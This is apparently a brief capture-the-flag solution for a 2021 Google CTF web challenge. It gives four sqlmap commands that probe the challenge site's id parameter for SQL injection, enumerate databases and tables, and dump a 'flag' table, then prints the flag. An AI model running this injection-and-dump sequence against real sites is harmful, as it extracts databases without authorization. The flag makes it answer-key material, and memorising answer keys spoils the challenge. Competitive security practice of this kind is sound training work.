> Reference: https://github.com/Dvd848/CTFs/blob/master/2021_GoogleCTF_BQ/14_Unknown_-_Prison_Cell.md

1. `sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4`

1. `sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4 --dbs`

1. `sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4 --tables -D quotedb`

1. `sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4 --dump -D quotedb -T flag`

> CTF{little_bobby_tables_we_call_him}
